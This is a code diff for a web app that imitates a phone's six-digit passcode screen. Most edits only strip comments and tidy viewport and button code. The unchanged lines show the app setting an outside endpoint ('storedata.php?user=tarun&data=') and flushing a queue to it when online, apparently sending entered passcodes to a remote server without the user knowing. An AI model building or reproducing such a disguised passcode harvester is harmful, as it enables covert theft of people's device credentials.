@@ -1,16 +1,14 @@
 (() => {
   // --- VIEWPORT helper: set --app-viewport-height to the real viewport height ---
-  // This prevents iOS PWA from showing top/bottom filler bands and stops rubber-band
+  // This prevents iOS PWA from showing top/bottom filler bands and stops rubber-band.
   function updateAppViewportHeight() {
     try {
-      // Use visualViewport when available for more accurate height on iOS Safari
       const h = (window.visualViewport && window.visualViewport.height) ? window.visualViewport.height : window.innerHeight;
       document.documentElement.style.setProperty('--app-viewport-height', `${Math.round(h)}px`);
     } catch (e) {
       // ignore
     }
   }
-  // run now and on changes
   updateAppViewportHeight();
   window.addEventListener('resize', updateAppViewportHeight, { passive: true });
   window.addEventListener('orientationchange', () => setTimeout(updateAppViewportHeight, 250), { passive: true });
@@ -18,22 +16,20 @@
     window.visualViewport.addEventListener('resize', updateAppViewportHeight);
     window.visualViewport.addEventListener('scroll', updateAppViewportHeight);
   }
+
   // prevent overscroll bounce in-app (should be honored by browsers)
   document.addEventListener('touchmove', (e) => {
-    // allow touch inside interactive elements; otherwise prevent page-level overscroll
     const el = e.target;
     if (!el) {
       e.preventDefault();
       return;
     }
-    // If the touch is within a scrollable container we shouldn't block it.
-    // This app doesn't have any scrolling containers — so we preventDefault to stop rubber-band.
+    // App has no scrollable containers; prevent default to stop page-level overscroll
     if (!el.closest('.scrollable')) {
       e.preventDefault();
     }
   }, { passive: false });
 
-  // --- your original code below (kept unchanged except variable names as in original) ---
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
   const MAX = 6; // <-- passcode length (6 digits)
   let code = "";
@@ -80,20 +76,15 @@
   }
 
   (function ensureFreshSessionOnLaunch() {
-    // Use sessionStorage as a per-session marker. When a new PWA launch happens
-    // the browsing context is new and sessionStorage will be empty — we clear.
     try {
       const alreadyStarted = sessionStorage.getItem('pass_session_started');
       function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }
 
-      // If no session flag, treat this as a fresh launch and clear persisted data.
       if (!alreadyStarted) {
         clearSavedAttempts();
         markStarted();
       }
 
-      // Also respond to pageshow (covers bfcache restores). If sessionStorage was cleared
-      // (new browsing context) pageshow will still call init above.
       window.addEventListener('pageshow', () => {
         if (!sessionStorage.getItem('pass_session_started')) {
           clearSavedAttempts();
@@ -101,7 +92,6 @@
         }
       }, { passive: true });
     } catch (err) {
-      // if anything goes wrong, fail silently and don't break the app
       console.warn('session init check failed', err);
     }
   })();
@@ -110,10 +100,9 @@
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
   function refreshDots() {
-    // Ensure dotEls are up-to-date if DOM changed
     const dots = Array.from(document.querySelectorAll('.dot'));
     dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
-    updateCancelText(); // keep label in sync whenever dots change
+    updateCancelText();
   }
 
   function reset() {
@@ -441,7 +430,6 @@
 
   // ----------------- Cancel / Delete behavior (non-destructive) -----------------
   function updateCancelText() {
-    // refresh reference (in case DOM swapped) and update text
     cancelBtn = document.getElementById('cancel') || cancelBtn;
     if (!cancelBtn) return;
     cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
@@ -450,19 +438,16 @@
   function wireCancelAsDelete() {
     const old = document.getElementById('cancel');
     if (!old) return;
-    // clone to remove prior listeners safely
     const cloned = old.cloneNode(true);
     old.parentNode && old.parentNode.replaceChild(cloned, old);
     cancelBtn = document.getElementById('cancel');
     cancelBtn.addEventListener('click', (e) => {
       e.preventDefault();
       if (code.length > 0) {
-        // delete last digit
         code = code.slice(0, -1);
         refreshDots();
         updateCancelText();
       } else {
-        // original cancel behavior
         reset();
       }
     });
@@ -470,7 +455,6 @@
 
   wireCancelAsDelete();
   updateCancelText();
-  // ------------------------------------------------------------------------------
 
   window.addEventListener('online', flushQueue);
   flushQueue();
